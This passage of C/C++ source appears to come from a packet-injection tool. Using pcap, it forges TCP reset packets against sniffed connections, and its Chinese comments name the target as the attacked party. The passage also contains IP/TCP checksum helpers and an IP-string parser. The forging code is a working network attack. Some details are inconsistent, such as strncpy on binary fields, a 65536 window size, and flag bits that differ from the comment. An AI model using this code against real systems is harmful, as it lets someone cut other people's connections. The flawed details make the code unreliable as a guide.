			strncpy((char*)&(TempIp4->DstIP.S_un.S_addr), (char*)&(Ip4Head->SrcIP.S_un.S_addr), 4);
			TempIp4->CheckSum = IpCheckSum((short*)TempIp4, 20);

			// 虚假的TCP头， 源端口目的端口交换、发送的序号是被攻击者的ack-1+4、期望收到的序号是被攻击者发出序号+1、长度字段、rst | ack标志置位、windowsize、其余忽略
			strncpy((char*)&(TempTcp->SrcPort), (char*)&(TcpHead->DstPort), 2);
			strncpy((char*)&(TempTcp->DstPort), (char*)&(TcpHead->SrcPort), 2);
			TempTcp->SeqNumber = TcpHead->AckNumber;
			TempTcp->SeqNumber = htonl(TempTcp->SeqNumber);
			TempTcp->AckNumber = TcpHead->SeqNumber;
			TempTcp->AckNumber = htonl(TempTcp->AckNumber);
			TempTcp->HeadLength = 5;
			TempTcp->HeadLength <<= 4;
			TempTcp->tag = 0;
			TempTcp->tag |= 1;
			//TempTcp->tag |= 1 << 4;
			TempTcp->WindowSize = 65536;
			TempTcp->CheckSum = Tcpchecksum((USHORT*)TempTcp, 20);
			pcap_sendpacket(PcapHandle[DevNumber], (u_char*)RstPacket, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead));
			//printf("已发送！\n");
		}
	}

	delete[] RstPacket;
}

// 下面这三个函数是在网上抄的
short IpCheckSum(short* ip_head_buffer, int ip_hdr_len)
{
	unsigned int check_sum = 0;                    //校验和初始化

	/* 校验和计算 */
	while (ip_hdr_len > 1)
	{
		check_sum += *ip_head_buffer++;            //一次移动2字节，注意short int实际类型长度
		ip_hdr_len -= sizeof(short int);
	}

	/* 如果有options字段;一般为3字节 */
	if (ip_hdr_len > 0)
	{
		check_sum += *(short int*)ip_head_buffer;  //如果只有1字节，需要类型转换
	}

	/* 进位相加 */
	check_sum = (check_sum & 0x0000FFFF) + (check_sum >> 16);
	check_sum += (check_sum >> 16);                 //上次进位相加的进位再加一次
	check_sum = ~check_sum;                         //取反
	return check_sum;
}
SHORT Tcpchecksum(USHORT* buffer, int size)
{
	unsigned long cksum = 0;
	while (size > 1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);	//将高16bit与低16bit相加
	cksum += (cksum >> 16);						//将进位到高位的16bit与低16bit 再相加
	return (USHORT)(~cksum);
}
unsigned int IPStrToInt(const char* ip)
{
	unsigned uResult = 0;
	int nShift = 24;
	int temp = 0;
	const char* pStart = ip;
	const char* pEnd = ip;
	while (*pEnd != '\0')
	{
		while (*pEnd != '.' && *pEnd != '\0')
		{
			pEnd++;
		}
		temp = 0;
		for (pStart; pStart != pEnd; ++pStart)
		{
			temp = temp * 10 + *pStart - '0';
		}
		uResult += temp << nShift;
		nShift -= 8;
		if (*pEnd == '\0')
			break;
		pStart = pEnd + 1;
		pEnd++;
	}
	return uResult;
}